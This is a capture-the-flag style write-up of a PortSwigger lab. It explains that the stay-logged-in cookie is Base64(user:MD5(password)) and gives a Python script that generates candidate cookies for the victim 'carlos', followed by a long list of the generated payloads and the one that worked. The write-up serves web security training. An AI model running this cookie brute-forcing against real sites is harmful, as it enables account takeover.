
# Brute-forcing a stay-logged-in cookie

This lab allows users to stay logged in even after they close their browser session. The cookie used to provide this functionality is vulnerable to brute-forcing.

To solve the lab, brute-force Carlos's cookie to gain access to his "My account" page.

- Your credentials: wiener:peter

- Victim's username: carlos

- Candidate passwords

---------------------------------------------

References: 

- https://portswigger.net/web-security/authentication/other-mechanisms



![img](images/Brute-forcing%20a%20stay-logged-in%20cookie/1.png)

---------------------------------------------

There is an option to stay logged in:



![img](images/Brute-forcing%20a%20stay-logged-in%20cookie/2.png)


It generates a cookie “stay-logged-in”:



![img](images/Brute-forcing%20a%20stay-logged-in%20cookie/3.png)


The content of the cookie is the Base64 encode value of “wiener:51dc30ddc473d43a6011e9ebba6ca770”, and “51dc30ddc473d43a6011e9ebba6ca770” is the MD5 hash of “peter”. So the formula for the cookie is BASE64(user:MD5(password)):



![img](images/Brute-forcing%20a%20stay-logged-in%20cookie/4.png)


With just this cookie it is possible to connect to /my-account:



![img](images/Brute-forcing%20a%20stay-logged-in%20cookie/5.png)


I will create the possible values with this script:

```
import hashlib, base64

pwds = open("pass.txt").read().splitlines()

for i in pwds:
        result = hashlib.md5(i.encode())
        #print(result.hexdigest())
        message = "carlos:"+result.hexdigest()
        #print(message)
        message_bytes = message.encode('ascii')
        base64_bytes = base64.b64encode(message_bytes)
        base64_message = base64_bytes.decode('ascii')
        print(base64_message)
```



![img](images/Brute-forcing%20a%20stay-logged-in%20cookie/6.png)


```
Y2FybG9zOmUxMGFkYzM5NDliYTU5YWJiZTU2ZTA1N2YyMGY4ODNl
Y2FybG9zOjVmNGRjYzNiNWFhNzY1ZDYxZDgzMjdkZWI4ODJjZjk5
Y2FybG9zOjI1ZDU1YWQyODNhYTQwMGFmNDY0Yzc2ZDcxM2MwN2Fk
Y2FybG9zOmQ4NTc4ZWRmODQ1OGNlMDZmYmM1YmI3NmE1OGM1Y2E0
Y2FybG9zOjI1ZjllNzk0MzIzYjQ1Mzg4NWY1MTgxZjFiNjI0ZDBi
Y2FybG9zOjgyN2NjYjBlZWE4YTcwNmM0YzM0YTE2ODkxZjg0ZTdi
Y2FybG9zOjgxZGM5YmRiNTJkMDRkYzIwMDM2ZGJkODMxM2VkMDU1
Y2FybG9zOjk2ZTc5MjE4OTY1ZWI3MmM5MmE1NDlkZDVhMzMwMTEy
Y2FybG9zOmZjZWE5MjBmNzQxMmI1ZGE3YmUwY2Y0MmI4YzkzNzU5
Y2FybG9zOjg2MjFmZmRiYzU2OTg4MjkzOTdkOTc3NjdhYzEzZGIz
Y2FybG9zOjQyOTdmNDRiMTM5NTUyMzUyNDViMjQ5NzM5OWQ3YTkz
Y2FybG9zOjI3NmY4ZGIwYjg2ZWRhYTdmYzgwNTUxNmM4NTJjODg5
Y2FybG9zOmU5OWExOGM0MjhjYjM4ZDVmMjYwODUzNjc4OTIyZTAz
Y2FybG9zOjM3YjRlMmQ4MjkwMGQ1ZTk0YjhkYTUyNGZiZWIzM2Mw
Y2FybG9zOmQwNzYzZWRhYTlkOWJkMmE5NTE2MjgwZTkwNDRkODg1
Y2FybG9zOjBkMTA3ZDA5ZjViYmU0MGNhZGUzZGU1YzcxZTllOWI3
Y2FybG9zOjNiZjExMTRhOTg2YmE4N2VkMjhmYzFiNTg4NGZjMmY4
Y2FybG9zOmViMGExOTE3OTc2MjRkZDNhNDhmYTY4MWQzMDYxMjEy
Y2FybG9zOmYzNzllYWYzYzgzMWIwNGRlMTUzNDY5ZDFiZWMzNDVl
Y2FybG9zOjZlZWE5YjdlZjE5MTc5YTA2OTU0ZWRkMGY2YzA1Y2Vi
Y2FybG9zOmM4ODM3YjIzZmY4YWFhOGEyZGRlOTE1NDczY2UwOTkx
Y2FybG9zOmJlZTc4M2VlMjk3NDU5NTQ4NzM1N2UxOTVlZjM4Y2Ey
Y2FybG9zOmU4MDdmMWZjZjgyZDEzMmY5YmIwMThjYTY3MzhhMTlm
Y2FybG9zOjBhY2Y0NTM5YTE0YjNhYTI3ZGVlYjRjYmRmNmU5ODlm
Y2FybG9zOmMzMzM2NzcwMTUxMWI0ZjYwMjBlYzYxZGVkMzUyMDU5
Y2FybG9zOjg0ZDk2MTU2OGE2NTA3M2EzYmNmMGViMjE2YjJhNTc2
Y2FybG9zOjFjNjMxMjlhZTlkYjljNjBjM2U4YWE5NGQzZTAwNDk1
Y2FybG9zOmRjMGZhN2RmM2QwNzkwNGEwOTI4OGJkMmQyYmI1ZjQw
Y2FybG9zOjkzMjc5ZTMzMDhiZGJiZWVkOTQ2ZmM5NjUwMTdmNjdh
Y2FybG9zOjY3MGIxNDcyOGFkOTkwMmFlY2JhMzJlMjJmYTRmNmJk
Y2FybG9zOjc2NDE5YzU4NzMwZDlmMzVkZTdhYzUzOGMyZmQ2NzM3
Y2FybG9zOjQ2Zjk0YzhkZTE0ZmIzNjY4MDg1MDc2OGZmMWI3ZjJh
Y2FybG9zOmIzNmQzMzE0NTFhNjFlYjJkNzY4NjBlMDBjMzQ3Mzk2
Y2FybG9zOjVmY2ZkNDFlNTQ3YTEyMjE1YjE3M2ZmNDdmZGQzNzM5
Y2FybG9zOmQxNmQzNzdhZjc2Yzk5ZDI3MDkzYWJjMjIyNDRiMzQy
Y2FybG9zOjE2NjBmZTVjODFjNGNlNjRhMjYxMTQ5NGM0MzllMWJh
Y2FybG9zOjAyYzc1ZmIyMmM3NWIyM2RjOTYzYzdlYjkxYTA2MmNj
Y2FybG9zOmExNTJlODQxNzgzOTE0MTQ2ZTRiY2Q0ZjM5MTAwNjg2
Y2FybG9zOjZiMWIzNmNiYjA0YjQxNDkwYmZjMGFiMmJmYTI2Zjg2
Y2FybG9zOmQ5YjIzZWJiZjliNDMxZDAwOWEyMGRmNTJlNTE1ZGI1
Y2FybG9zOmRhNDQzYTBhZDk3OWQ1NTMwZGYzOGNhMWE3NGU0Zjgw
Y2FybG9zOmVmNGNkZDMxMTc3OTNiOWZkNTkzZDc0ODg0MDk2MjZk
Y2FybG9zOmVjMGUyNjAzMTcyYzczYThiNjQ0YmI5NDU2YzFmZjZl
Y2FybG9zOmQ5MTRlM2VjZjZjYzQ4MTExNGEzZjUzNGE1ZmFmOTBi
Y2FybG9zOmY3OGYyNDc3ZTk0OWJlZTJkMTJhMmM1NDBmYjYwODRm
Y2FybG9zOjA1NzE3NDllMmFjMzMwYTc0NTU4MDljNmIwZTdhZjkw
Y2FybG9zOmYyNWEyZmM3MjY5MGI3ODBiMmExNGUxNDBlZjZhOWUw
Y2FybG9zOjA4ZjkwYzFhNDE3MTU1MzYxYTVjNGI4ZDI5N2UwZDc4
Y2FybG9zOmJmNzc5ZTA5MzNhODgyODA4NTg1ZDE5NDU1Y2Q3OTM3
Y2FybG9zOjY4NGM4NTFhZjU5OTY1YjY4MDA4NmI3YjQ4OTZmZjk4
Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx
Y2FybG9zOmRmMDM0OWNlMTEwYjY5ZjAzYjRkZWY4MDEyYWU0OTcw
Y2FybG9zOmFkOTI2OTQ5MjM2MTJkYTA2MDBkN2JlNDk4Y2MyZTA4
Y2FybG9zOmFhNDdmODIxNWM2ZjMwYTBkY2RiMmEzNmE5ZjQxNjhl
Y2FybG9zOjViYWRjYWY3ODlkM2QxZDA5Nzk0ZDhmMDIxZjQwZjBl
Y2FybG9zOmVlODlmN2E3YTA1NjViYTU2ZjhmYjU3OTRjMGJkOWZl
Y2FybG9zOmQwOTcwNzE0NzU3NzgzZTZjZjE3YjI2ZmI4ZTIyOThm
Y2FybG9zOjliMzA2YWIwNGVmNWUyNWY5ZmI4OWM5OThhNmFlZGFi
Y2FybG9zOmRmNTNjYTI2ODI0MGNhNzY2NzBjODU2NmVlNTQ1Njhh
Y2FybG9zOjIzNDVmMTBiYjk0OGM1NjY1ZWY5MWY2NzczYjNlNDU1
Y2FybG9zOmFhZTAzOWQ2YWEyMzljZmMxMjEzNTdhODI1MjEwZmEz
Y2FybG9zOmIzZjk1MmQ1ZDlhZGVhNmY2M2JlZTlkNGM2ZmNlZWFh
Y2FybG9zOmI1OWM2N2JmMTk2YTQ3NTgxOTFlNDJmNzY2NzBjZWJh
Y2FybG9zOmI0MjdlYmQzOWM4NDVlYjU0MTdiN2Y3YWFmMWY5NzI0
Y2FybG9zOjViMWI2OGE5YWJmNGQyY2QxNTVjODFhOTIyNWZkMTU4
Y2FybG9zOjFiYmQ4ODY0NjA4MjcwMTVlNWQ2MDVlZDQ0MjUyMjUx
Y2FybG9zOmUwNDc1NTM4N2U1YjU5NjhlYzIxM2U0MWY3MGMxZDQ2
Y2FybG9zOmQ1YWExNzI5YzhjMjUzZTVkOTE3YTUyNjQ4NTVlYWI4
Y2FybG9zOmY2M2Y0ZmJjOWY4Yzg1ZDQwOWYyZjU5ZjJiOWUxMmQ1
Y2FybG9zOjFhMWRjOTFjOTA3MzI1YzY5MjcxZGRmMGM5NDRiYzcy
Y2FybG9zOjFkM2QzNzY2N2E4ZDdlYjAyMDU0YzZhZmRmOWUyZTFj
Y2FybG9zOjU1ODM0MTM0NDMxNjRiNTY1MDBkZWY5YTUzM2M3Yzcw
Y2FybG9zOjBiNGU3YTBlNWZlODRhZDM1ZmI1Zjk1YjljZWVhYzc5
Y2FybG9zOjZmNGVjNTE0ZWVlODRjYzU4YzhlNjEwYTBjODdkN2Ey
Y2FybG9zOjhhZmE4NDdmNTBhNzE2ZTY0OTMyZDk5NWM4ZTc0MzVh
Y2FybG9zOmQxMTMzMjc1ZWUyMTE4YmU2M2E1NzdhZjc1OWZjMDUy
Y2FybG9zOmZlYTBmMWY2ZmVkZTkwYmQwYTkyNWI0MTk0ZGVhYzEx
Y2FybG9zOjYyMDk4MDQ5NTIyMjVhYjNkMTQzNDgzMDdiNWE0YTI3
Y2FybG9zOjZiMTYyOGIwMTZkZmY0NmU2ZmEzNTY4NGJlNmFjYzk2
Y2FybG9zOmI1YzBiMTg3ZmUzMDlhZjBmNGQzNTk4MmZkOTYxZDdl
Y2FybG9zOmFkZmY0NGM1MTAyZmNhMjc5ZmNlNzU1OWFiZjY2ZmVl
Y2FybG9zOmZjNjNmODdjMDhkNTA1MjY0Y2FiYTM3NTE0Y2QwY2Zk
Y2FybG9zOjkxY2IzMTVhNjQwNWJmY2MzMGUyYzQ1NzFjY2ZiOGNl
Y2FybG9zOjVlZjY0YmFkOGY5ZDdlMGM4NWY4MjE1ODBlNGQ2NjI5
Y2FybG9zOmU2YTViYTA4NDJhNTMxMTYzNDI1ZDY2ODM5NTY5YTY4
Y2FybG9zOjlkZjNiMDFjNjBkZjIwZDEzODQzODQxZmYwZDQ0ODJj
Y2FybG9zOjFkMTBjYTdmOGZlMjYxNWJmNzJhMjQ5YTdkMzRkNmI5
Y2FybG9zOjZlYmU3NmM5ZmI0MTFiZTk3YjNiMGQ0OGI3OTFhN2M5
Y2FybG9zOjA5ZjgzMTZlMjk2NDlhN2Y3OTVmNDE0YmEzODYwZmMw
Y2FybG9zOjIyOTk3OWZjZTUxNzRjMTdkNDY0NWJmODc1MmRhZTFl
Y2FybG9zOjVjNzY4NmMwMjg0ZTA4NzViMjZkZTk5YzEwMDhlOTk4
Y2FybG9zOjdkOGJjNWYxYThkMzc4N2QwNmVmMTFjOTdkNDY1NWRm
Y2FybG9zOjIxYjcyYzBiN2FkYzVjN2I0YTUwZmZjYjkwZDkyZGQ2
Y2FybG9zOmIzZThjZGQ5ZmY0NDI1OWZkNjdlODc5ZTU3OGNkOGY0
Y2FybG9zOmJkMWQ3YjA4MDllNGI0ZWU5Y2EzMDdhYTUzMDhlYTZm
Y2FybG9zOjA4YjU0MTFmODQ4YTI1ODFhNDE2NzJhNzU5Yzg3Mzgw
Y2FybG9zOjg5OTQ4YzdmNDg5MGFmNWZmMTg1MjRiNGZjM2YzNjEx
Y2FybG9zOjY1NzlhOTJlN2Y1YWM3YzU3MDU1MTk2YjNhZmUzZGRk
Y2FybG9zOjZkNGRiNWZmMGMxMTc4NjRhMDI4MjdiYWQzYzM2MWI5
Y2FybG9zOjYzYjA0YTM3MTg0OTY5NGVmMzg2NDY4N2FkY2I0MTBh
```

We get a different response with “Y2FybG9zOmIzZThjZGQ5ZmY0NDI1OWZkNjdlODc5ZTU3OGNkOGY0”, which is the payload for the password “mobilemail”:





![img](images/Brute-forcing%20a%20stay-logged-in%20cookie/7.png)
![img](images/Brute-forcing%20a%20stay-logged-in%20cookie/8.png)